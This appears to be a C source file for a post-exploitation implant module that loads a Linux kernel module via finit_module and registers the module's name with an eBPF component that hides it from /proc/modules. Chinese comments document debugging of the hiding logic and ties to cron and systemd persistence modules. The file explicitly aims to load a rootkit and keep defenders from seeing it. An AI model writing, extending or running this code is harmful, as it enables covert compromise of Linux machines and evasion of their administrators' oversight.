/// ko_load.c — BOF: load a kernel module via finit_module (no insmod execve)
/// Compile: gcc -c -o ko_load.o ko_load.c -include bof_api.h -Os -fPIC
/// Usage: execute bof ko_load.o <path-to-ko>
///
/// The .ko must match the target kernel version/vermagic (prebuilt matrix).
/// Requires CAP_SYS_MODULE; blocked under kernel lockdown / module sig
/// enforcement — the syscall error code reports which.

#include "bof_api.h"

#define O_RDONLY 00

/// 取 /proc/modules **首行**的首个 token（= 最近加载的模块名），写进 out（NUL 结尾）。
///
/// ★ 方向是**实测**出来的，不是推断（2026-09-16）：
///     $ insmod /tmp/p22ko/axp22pos.ko
///     $ grep -n '^axp22pos' /proc/modules   → 1     （总行数 55 → 56）
///     $ tail -1 /proc/modules | cut -d' ' -f1 → cryptd
///   即 **新加载的在最前**（内核把新模块插在链表头），末行是开机就在的老模块。
///   本函数原来读**末行**，于是恒定返回最老的模块名 —— p22 首跑的回执是
///   `hide: cryptd -> ok`：它把**无辜模块** cryptd 登记进了 hide_names，redact
///   转而去抹 cryptd 的名字。**这比不登记更显眼**，正是末尾那道护栏想防的事，
///   但护栏（末行必须是完整行、不能全空格）对"整行取错了方向"完全无效 ——
///   两个条件都满足，取到的却是一个真实存在的别人的名字。
///
///   `redact.c:85-86` 的扫描窗口注释写着**同一个错误前提**（"后加载的排在末尾 →
///   扫尾部"），所以这次修复要分别回答两件事：① 名字登记得对不对（本函数 + 差集），
///   ② redact 的窗口扫不扫得到新模块（那在 eBPF 侧，p22 的 T5 是它的判据）。
///
/// ★ 因此调用方必须做**前后差集**：只有"首行名字相对加载前发生了变化"才登记。
///   取不到、或和加载前一样 → 跳过登记（宁可不登记，也绝不误伤无辜模块名）。
///
/// 为什么不解析 .ko 的 ELF 拿名字：那要把 ELF / 压缩段解析引进一个 BOF，成本与
/// 出错面都不划算。
///
/// 只读首块 512B（首行必在其中：模块名上限 64 字节，整行 ≤ ~200 字节），
/// 所以内存与模块总数无关。
/// 返回名字长度；0 = 取不到 —— 调用方跳过登记，**不当错误处理**。
///
/// 时机上也安全：调用点只在 `finit_module` **成功之后**才调它，那一刻这个名字
/// 还没进 `hide_names`，因此即便 `redact` 已经加载，读回来的也是原样文本
/// （那个过滤器只抹**已登记**的名字）。
///
/// 只保留最后一块读（目标在文件末尾），所以内存与模块总数无关。
/// 返回名字长度；0 = 取不到 —— 调用方跳过登记，**不当错误处理**。
static int ax_head_modname(char *out, int outsz) {
    char buf[512];
    int  n, i, j;
    int  fd = AxOpenFile("/proc/modules", O_RDONLY, 0);
    if (fd < 0)
        return 0;
    n = AxReadFile(fd, buf, sizeof(buf));       /* 首行在第一块里，读一次就够 */
    AxCloseFile(fd);
    if (n <= 0)
        return 0;
    for (i = 0; i < n; i++)                     /* 首行终点 = 第一个换行 */
        if (buf[i] == '\n' || buf[i] == '\r')
            break;
    n = i;                                      /* n = 首行长度（不含换行）*/
    for (i = 0; i < n; i++)                     /* 首个 token 终点 = 首个空白 */
        if (buf[i] == ' ' || buf[i] == '\t')
            break;
    if (i <= 0 || i >= outsz)
        return 0;
    for (j = 0; j < i; j++)                     /* 全空格 = redact 的抹平形态，
                                                   说明该名已在 hide_names 里 */
        if (buf[j] != ' ')
            break;
    if (j == i)
        return 0;
    AxMemcpy(out, buf, i);
    out[i] = 0;
    return i;
}

void go(char *args, int args_len) {
    datap parser;
    BeaconDataParse(&parser, args, args_len);
    int path_len = 0;
    char *path = BeaconDataExtract(&parser, &path_len);
    if (!path || path_len <= 0) {
        BeaconPrintf(CALLBACK_ERROR, "[-] ko_load: missing .ko path\n");
        return;
    }

    /* ★ BeaconDataExtract 返回的是**长度切片的裸指针，不保证 NUL 终止**。
     *   args 是 agent 收到的 msgpack 报文（{content, args, entry_func}，
     *   elf_bof.c:753）里 `args` 字段的一个切片，切片后面紧跟的就是同一缓冲区
     *   里的下一个 msgpack 字段。把它直接喂给 AxOpenFile/`%s`，会一路把相邻
     *   内存当成路径读下去。
     *   实测（p22 首跑）：
     *     [-] ko_load: cannot open /tmp/p22ko/axp22probe.ko<垃圾>entry_func<垃圾>go
     *   —— 尾巴上的 `entry_func` / `go` 正是 msgpack 的同级键值。open() 当然 ENOENT。
     *   这个缺陷**一直存在**，只是"切片后面那个字节恰好为 0"时才能蒙对。
     *   写法对齐 cron_persist.c:29 / memfd_exec.c:35（已是正确写法）：
     *   拷进有终止的本地缓冲，后续统一用它。 */
    char kpath[256];
    if (path_len >= (int)sizeof(kpath)) {
        BeaconPrintf(CALLBACK_ERROR, "[-] ko_load: path too long (%d)\n", path_len);
        return;
    }
    AxMemcpy(kpath, path, path_len);
    kpath[path_len] = '\0';

    int fd = AxOpenFile(kpath, O_RDONLY, 0);
    if (fd < 0) {
        BeaconPrintf(CALLBACK_ERROR, "[-] ko_load: cannot open %s\n", kpath);
        return;
    }

    /* ★ 登记前先拍"加载前的首行"快照 —— 差集靠它证明"这个名字是刚出现的"
     *   （方向本身也是实测出来的，见 ax_head_modname 头部注释）。 */
    char before[64];
    int  have_before = ax_head_modname(before, sizeof(before));

    long r = AxFinitModule(fd, 0);
    AxCloseFile(fd);

    if (r == 0) {
        /* ★ G7 接线（ISS-071）：把模块名登记进 hide_names。
         *
         * 不登记的话 `redact.c` 那套「/proc/modules 名字抹平」**没有触发
         * 条件** —— 它抹的正是 `hide_names` 里登记的名字（`redact.c:340` 是
         * `bpf_map_lookup_elem(&hide_names, kb)` 在驱动）。后果不是"抹成空白"而是
         * **名字原样可读**，比前者严重得多。（该窗口本身另有一个方向性疑点，
         * 见 `redact.c:85-86` 与 ax_head_modname 注释；由 p22 的 T5 判定。）
         *
         * 这就是 P6「复活层 × 隐藏层联动」漏掉的那个落点：cron_persist 与
         * systemd_persist 都接了 `AxHideNameAdd`，ko_load 没接。而 p15 的 D3 验收
         * 长期全绿，是因为**它在加载 rootkit 时手工把模块名当 seed 喂了进去**
         * （`p15_redact_verify.py:207-208`）—— 测试供给了生产路径本该自己供给的
         * 那个输入，于是测的是"抹平机制有效"，接线缺失被完全掩盖。 */
        char mname[64];
        int  mn = ax_head_modname(mname, sizeof(mname));
        /* ★ 只认"首行相对加载前**变了**"的那一个。取不到、或与加载前相同 → 无法
         *   证明它是新模块 → 跳过登记。宁可漏登记（回执里有 hide_add 手工兜底），
         *   也绝不把无辜模块名写进 hide_names：在 /proc/modules 里抹掉别人的名字，
         *   比不抹更显眼。 */
        if (mn > 0 && (have_before <= 0 ||
                       AxStrncmp(mname, before, sizeof(before)) == 0))
            mn = 0;
        int  hr = mn > 0 ? AxHideNameAdd((const char *)0, mname) : -1;
        BeaconPrintf(CALLBACK_OUTPUT, "[+] ko_load: module loaded from %s\n", kpath);
        if (mn > 0)
            BeaconPrintf(CALLBACK_OUTPUT, "    hide: %s -> %s\n", mname,
                         hr == 0 ? "ok" : (hr == -2 ? "no-map" : "fail"));
        if (hr < 0)
            BeaconPrintf(CALLBACK_OUTPUT,
                         "    [*] 未自动登记（模块名读不到 / eBPF 未加载 / pin 未知）——\n"
                         "        对手 `cat /proc/modules` 能看见模块名。手工补：\n"
                         "        execute bof hide_add.o <pin> <modname>\n");
    } else {
        BeaconPrintf(CALLBACK_ERROR, "[-] ko_load: finit_module failed (err=%ld)\n", -r);
    }
}
